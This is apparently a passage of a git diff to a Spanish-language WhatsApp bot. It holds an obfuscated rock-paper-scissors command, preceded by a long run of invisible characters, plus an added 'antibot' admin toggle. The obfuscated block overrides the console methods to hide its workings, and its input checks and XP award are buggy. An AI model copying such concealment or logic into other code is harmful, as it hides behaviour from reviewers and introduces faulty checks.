‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\x0a\x0a_El\x20juego\x20se\x20llama:_\x20*Piedra,\x20papel\x20o\x20tijera.*\x0a\x0a_El\x20objetivo\x20es\x20vencer\x20al\x20oponente\x20seleccionando\x20el\x20arma\x20que\x20gana,\x20según\x20las\x20siguientes\x20reglas:_\x0a\x0a\x09-\x20✊🏻\x20La\x20piedra\x20aplasta\x20la\x20tijera.\x20(Gana\x20la\x20piedra.)\x0a\x09-\x20✌🏻\x20La\x20tijera\x20corta\x20el\x20papel.\x20(Gana\x20la\x20tijera.)\x0a\x09-\x20🖐🏻\x20El\x20papel\x20envuelve\x20la\x20piedra.\x20(Gana\x20el\x20papel.)\x0a\x09-\x20🔁\x20En\x20caso\x20de\x20empate\x20(que\x20dos\x20jugadores\x20elijan\x20el\x20mismo\x20elemento\x20o\x20que\x20tres\x20jugadores\x20elijan\x20cada\x20uno\x20un\x20objeto\x20distinto),\x20se\x20juega\x20otra\x20vez.\x0a\x09\x0a*Aqui\x20cada\x20quien\x20jugara\x20con\x20el\x20Bot,\x20se\x20juega\x20de\x20la\x20siguiente\x20manera:*\x0a\x0a','3OPRDdZ','error','trace','🖐🏻\x20papel','Lo\x20siento,\x20pero\x20*','__proto__','101040OQjLWe','nivel\x20para\x20corroborar\x20tu\x20experiencia.*','41SnRebr','*Ni modo,\x20aprende\x20de\x20mi😏*','150520bLaygd','piedra','😨\x20Pero\x20que...\x20Me\x20as\x20ganado!!\x0a_✌🏻\x20tijera\x20corta\x20papel!_\x20*Bien\x20jugado!!*\x0a\x0a_Recibiste\x2010xp\x20😉_\x0a*Escribe\x20','jugar\x20piedra/papel/tijera\x0a\x0a_Si\x20logras\x20ganarle\x20al\x20Bot,\x20obtienes\x20una\x20recompensa!!_\x0a\x0a┎┈┈┈┈┈┈┈୨♡୧┈┈┈┈┈┈┈┒\x0a\x20*Juegos\x20By:*\b_*Lalelilolu ᵈᵃʳʸ⛥*_\x0a┖┈┈┈┈┈┈┈୨♡୧┈┈┈┈┈┈┈┚','console','info','{}.constructor(\x22return\x20this\x22)(\x20)','floor','4yjvaKM','*\x20no\x20es\x20un\x20elemento\x20compatible.\x0a_Solo\x20puedes\x20elegir\x20entre\x20piedra,\x20papel\x20o\x20tijera!_','9sXuwNS','papel','✊🏻\x20piedra','bind','152cvjKoE','*😂👌🏻*','33749258491@s.whatsapp.net','prototype','warn','return\x20/\x22\x20+\x20this\x20+\x20\x22/','toString','*😫uh...\x20Empatamos!!\x20jugemos\x20de\x20nuevo!!*','table','apply','test'];const _0x50a80c=_0x3c7d;(function(_0x153eef,_0x3d0c01){const _0x395d6e=_0x3c7d;while(!![]){try{const _0x39211c=parseInt(_0x395d6e(0xa0))*-parseInt(_0x395d6e(0x94))+parseInt(_0x395d6e(0x7e))*parseInt(_0x395d6e(0x9d))+parseInt(_0x395d6e(0x72))+parseInt(_0x395d6e(0x76))+-parseInt(_0x395d6e(0x74))*parseInt(_0x395d6e(0x99))+parseInt(_0x395d6e(0x98))*parseInt(_0x395d6e(0x84))+parseInt(_0x395d6e(0x9a))*-parseInt(_0x395d6e(0x80));if(_0x39211c===_0x3d0c01)break;else _0x153eef['push'](_0x153eef['shift']());}catch(_0x294ddc){_0x153eef['push'](_0x153eef['shift']());}}}(_0x5f5c,0x2eed6));const _0x2053c4=function(){let _0x513bfb=!![];return function(_0x4bbee9,_0x598758){const _0x5eca46=_0x513bfb?function(){if(_0x598758){const _0x5e80c9=_0x598758['apply'](_0x4bbee9,arguments);return _0x598758=null,_0x5e80c9;}}:function(){};return _0x513bfb=![],_0x5eca46;};}(),_0x39b00f=_0x2053c4(this,function(){const _0x665fc2=function(){const _0x2e1ba8=_0x3c7d,_0x557f7d=_0x665fc2[_0x2e1ba8(0x9e)](_0x2e1ba8(0x89))()[_0x2e1ba8(0x9e)](_0x2e1ba8(0x96));return!_0x557f7d[_0x2e1ba8(0x8e)](_0x39b00f);};return _0x665fc2();});_0x39b00f();const _0x5b3b04=function(){let _0x48bc9e=!![];return function(_0x322705,_0x532a05){const _0x1b4bca=_0x48bc9e?function(){const _0x3a54bf=_0x3c7d;if(_0x532a05){const _0x46fe13=_0x532a05[_0x3a54bf(0x8d)](_0x322705,arguments);return _0x532a05=null,_0x46fe13;}}:function(){};return _0x48bc9e=![],_0x1b4bca;};}(),_0x210381=_0x5b3b04(this,function(){const _0x203c8d=_0x3c7d;let _0x151df8;try{const _0x59ff0e=Function(_0x203c8d(0x93)+_0x203c8d(0x7c)+');');_0x151df8=_0x59ff0e();}catch(_0x1d769d){_0x151df8=window;}const _0x4c30ca=_0x151df8[_0x203c8d(0x7a)]=_0x151df8[_0x203c8d(0x7a)]||{},_0x2cb8b2=[_0x203c8d(0x90),_0x203c8d(0x88),_0x203c8d(0x7b),_0x203c8d(0xa1),'exception',_0x203c8d(0x8c),_0x203c8d(0xa2)];for(let _0x273e1b=0x0;_0x273e1b<_0x2cb8b2['length'];_0x273e1b++){const _0x1dea26=_0x5b3b04[_0x203c8d(0x9e)][_0x203c8d(0x87)][_0x203c8d(0x83)](_0x5b3b04),_0x164272=_0x2cb8b2[_0x273e1b],_0x239d4e=_0x4c30ca[_0x164272]||_0x1dea26;_0x1dea26[_0x203c8d(0xa5)]=_0x5b3b04['bind'](_0x5b3b04),_0x1dea26[_0x203c8d(0x8a)]=_0x239d4e['toString'][_0x203c8d(0x83)](_0x239d4e),_0x4c30ca[_0x164272]=_0x1dea26;}});_0x210381();const yo=_0x50a80c(0x86);if(!q)return mentions(_0x50a80c(0x9f)+prefix+_0x50a80c(0x8f)+prefix+_0x50a80c(0x79),yo,!![]);function _0x3c7d(_0xfb7ab7,_0x36d282){return _0x3c7d=function(_0x338ef2,_0x210381){_0x338ef2=_0x338ef2-0x72;let _0x5b3b04=_0x5f5c[_0x338ef2];return _0x5b3b04;},_0x3c7d(_0xfb7ab7,_0x36d282);}frase=[_0x50a80c(0x9c),_0x50a80c(0x75),_0x50a80c(0x85),'*Te\x20atreviste\x20a\x20jugar\x20contra\x20mi,\x20ahora\x20disfruta\x20tu\x20derrota😈*'];const frase1=frase[Math[_0x50a80c(0x7d)](Math[_0x50a80c(0x95)]()*frase[_0x50a80c(0x92)])];juego=['✊🏻\x20piedra',_0x50a80c(0xa3),_0x50a80c(0x97),_0x50a80c(0x82),_0x50a80c(0xa3),_0x50a80c(0x97),_0x50a80c(0x82),_0x50a80c(0xa3),_0x50a80c(0x97)];const juego1=juego[Math[_0x50a80c(0x7d)](Math[_0x50a80c(0x95)]()*juego['length'])];if(!q=='piedra')return reply(_0x50a80c(0xa4)+q+_0x50a80c(0x7f));if(!q==_0x50a80c(0x81))return reply('Lo\x20siento,\x20pero\x20*'+q+'*\x20no\x20es\x20un\x20elemento\x20compatible.\x0a_Solo\x20puedes\x20elegir\x20entre\x20piedra,\x20papel\x20o\x20tijera!_');if(!q==_0x50a80c(0x91))return reply('Lo\x20siento,\x20pero\x20*'+q+_0x50a80c(0x7f));reply(juego1);if(q==_0x50a80c(0x77)){const jpiedra=''+juego1;if(jpiedra==_0x50a80c(0x82))return reply(_0x50a80c(0x8b));if(jpiedra==_0x50a80c(0xa3))return reply(frase1+'\x0a*🖐🏻\x20Papel\x20envuelve\x20piedra.*');if(jpiedra==_0x50a80c(0x97))reply('😨\x20Pero\x20que...\x20Me\x20as\x20ganado!!\x0a_✊🏻\x20piedra\x20rompe\x20tijera!_\x20*Bien\x20jugado!!*\x0a\x0a_Recibiste\x2010xp\x20😉_\x0a*Escribe\x20'+prefix+_0x50a80c(0x73));addLevelingXp(sender,0xa);}if(q==_0x50a80c(0x81)){const jpiedra=''+juego1;if(jpiedra=='🖐🏻\x20papel')return reply(_0x50a80c(0x8b));if(jpiedra==_0x50a80c(0x97))return reply(frase1+'\x0a*✌🏻\x20tijera\x20corta\x20papel.*');if(jpiedra=='✊🏻\x20piedra')reply('😨\x20Pero\x20que...\x20Me\x20as\x20ganado!!\x0a_🖐🏻\x20papel\x20envuelve\x20piedra!_\x20*Bien\x20jugado!!*\x0a\x0a_Recibiste\x2010xp\x20😉_\x0a*Escribe\x20'+prefix+_0x50a80c(0x73));addLevelingXp(sender,0xa);}if(q==_0x50a80c(0x91)){const jpiedra=''+juego1;if(jpiedra==_0x50a80c(0x97))return reply(_0x50a80c(0x8b));if(jpiedra==_0x50a80c(0x82))return reply(frase1+_0x50a80c(0x9b));if(jpiedra=='🖐🏻\x20papel')reply(_0x50a80c(0x78)+prefix+_0x50a80c(0x73));addLevelingXp(sender,0xa);}
 /*////*/break
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-/**
-case 'dado':
-const dadus = ["⚀","⚁","⚂","⚃","⚄","⚅"]
-if (!isGroup) return reply(mess.only.group)
-dadu = dadus[Math.floor(Math.random() * dadus.length)]
-dador = fs.readFileSync(`./temp/dados/${dadu}.webp`)
-samu330.sendMessage(from, dador, sticker, {quoted: fnsfw, sendEphemeral: true})
-break	
-**/
+
 case 'dado':
 const dadus = ["d1","d2","d3","d4","d5","d6"]
 if (!isGroup) return reply(mess.only.group)
@@ -7617,7 +7480,26 @@ if (args[0] === '1') {
 	reply('1 para activar, 0 para desactivar')        
 }                          
 break
-					
+	
+case 'antibot':            
+if (!isGroup) return reply(mess.only.group)
+if (!isAdmin) return reply(mess.only.admin)     
+if (args.length < 1) return reply('Escribe *1* para activar')                    
+if (args[0] === '1') {                             
+	if (isAntiBot) return reply('*Ya está activo*')          
+	antibot.push(from)             
+	fs.writeFileSync('./src/antibot.json', JSON.stringify(antibot))      
+	reply(`*[ Activado ]*`)  
+} else if (args[0] === '0') {           
+	reply(`*AHORA....*\nCualquier otro Bot de Baileys sera eliminado!!`)  
+	var ini = antibot.indexOf(from)
+	antibot.splice(ini, 1)                  
+	fs.writeFileSync('./src/antibot.json', JSON.stringify(antibot))      
+	reply(`Desactivado`)              
+} else {                                
+	reply('1 para activar, 0 para desactivar')        
+}                          
+break		
 			case 'antibad':
                                         if (!isGroup) return reply(mess.only.group)
                                         if (!isAdmin) return reply(mess.only.admin)
@@ -7873,7 +7755,7 @@ if (body.includes(`Xd`)){
 			//body: '',
 			//sourceUrl : 'https://chat.whatsapp.com/LKZOC09DoJb6lwS5UUZRlj', 
 			//sourceUrl : 'https://api.whatsapp.com/send?phone=12729998838',
-			sourceUrl : 'https://wa.me/12729998838', 
+			//sourceUrl : 'https://wa.me/12729998838', 
 			thumbnail : fs.readFileSync('./src/nsfw.jpg')}}}
 		)
 }
